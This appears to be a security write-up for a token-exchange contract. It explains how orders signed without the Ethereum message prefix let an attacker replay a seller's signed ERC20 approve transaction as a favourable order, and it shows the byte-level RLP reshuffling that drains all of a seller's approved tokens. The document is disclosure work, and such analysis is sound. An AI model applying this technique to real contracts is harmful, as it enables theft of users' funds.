# Exploit

Orders are signed without including the `\x19Ethereum Signed Message:\n` prefix. Transactions are potentially valid orders, and in particular, type-2 ERC20 approval transactions are a match. This means that, for any order, an attacker can pick up the `approve` transaction sent by the seller to the token contract, and repurpose it as a valid order with an extremely favorable rate.

The file `test/exploit.js` has a proof of concept of the attack. In the example, the `approve` transaction looks like the following:

```json
{
  type: 2,
  accessList: [],
  maxPriorityFeePerGas: BigNumber { value: "1000000000" },
  maxFeePerGas: BigNumber { value: "69379087998" },
  gasLimit: BigNumber { value: "50000" },
  to: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
  value: BigNumber { value: "0" },
  nonce: 0,
  data: '0x095ea7b3000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000003635c9adc5dea00000',
  r: '0x88e28705819334231af97f7c776352b627d722522d73be127e60d1d4a109d616',
  s: '0x1944ba785436c6dae6ae33e435a6ccad2eb781e1b862ca68c118a147ed0c1eac',
  v: 1,
  chainId: 1,
}
```

Which serializes as:

```
0x02f86d0180843b9aca0085102e6f23c282c350945fbdb2315678afecb367f032d93f642f64180aa380b844095ea7b3000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000003635c9adc5dea00000c0
```

Unpacking from the RLP encoding, we see that:

```
02 # type
f86d # tx size (f8 means length field has size 1, 6d is actual length)
01 # chainId
80 # nonce (zero)
843b9aca00 # maxPriorityFeePerGas
85102e6f23c2 # maxFeePerGas
82c350 # gasLimit
94 # to length (20 bytes)
5fbdb2315678afecb367f032d93f642f64180aa3 # to (token contract address)
80 # value (zero)
b844 # data length (more rlp encoding shenanigans)
095ea7b3000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000003635c9adc5dea00000 # data (approve, spender, amount)
c0 # access list (empty)
```

Which we can reshuffle as the following:

```
02f86d0180843b9aca0085102e6f23c282c35094 # referrer
5fbdb2315678afecb367f032d93f642f64180aa3 # token address
80b844095ea7b3000000000000000000 # rate
000000 # nonce
e7f1725e7734ce288f8367e1bb143e90bb3f0512 # exchange contract
00000000000000000000000000000000000000000000003635c9adc5dea00000 # amount
c0 # order type
```

This matches the Order encoding prior to recovering the signer:

- The first 20 bytes (referrer) are unimportant, as long as they are indeed 20 bytes long. This holds for chainId 1 (mainnet), for reasonable values of gas fees (1 gwei priority, 50 gwei base fee), and for the ~50k gas usage of an ERC20 approval.
- The rate is guaranteed to start with `0x80` since `value` for an approval should be zero (rlp encoded as 0x80), which ensures a absurdly favorable rate for the buyer.
- The nonce can be skipped, since we'll be attacking this seller for all the value they have approved to the exchange, so there is no need for more than one attack.
- The address of the exchange is guaranteed to be in the `data` field, as is the recipient of the approval.
- The approval amount matches the amount of the assembled order, which allows the attacker to steal all approved funds.
- The order type is pretty much ignored as long as it's not zero, and will usually be `c0` since access lists are rarely populated.

The end result is that any seller can be drained of all the tokens they have approved for just a few wei.